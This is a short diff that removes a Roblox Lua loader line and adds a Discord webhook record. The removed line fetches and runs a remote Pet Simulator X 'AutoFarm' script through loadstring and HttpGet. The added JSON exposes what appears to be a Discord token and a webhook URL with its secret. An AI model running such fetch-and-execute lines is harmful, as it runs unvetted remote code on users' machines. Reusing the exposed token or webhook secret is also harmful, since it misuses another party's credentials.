@@ -1,2 +1,1 @@
-_G.UserName = "GrindingAlt_B0T"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+{"application_id":null,"avatar":null,"channel_id":"1358260248263004214","guild_id":"1358260248263004210","id":"1358258076947321004","name":"crosstrading1","type":1,"token":"MTM1ODI1ODA3Njk0NzMyMTAwNA.G8OaWC.tG59EncUx0ioLrm4EXU72GZP-5e60ifYYOU3zw","url":"https://discord.com/api/webhooks/1358263566779809914/kLSnlYJeeVWeDZXq6OVojBqFbjEjhrWLLlrSgSJv9P66ViFThnhh078O1KbNmY-crBh8"}
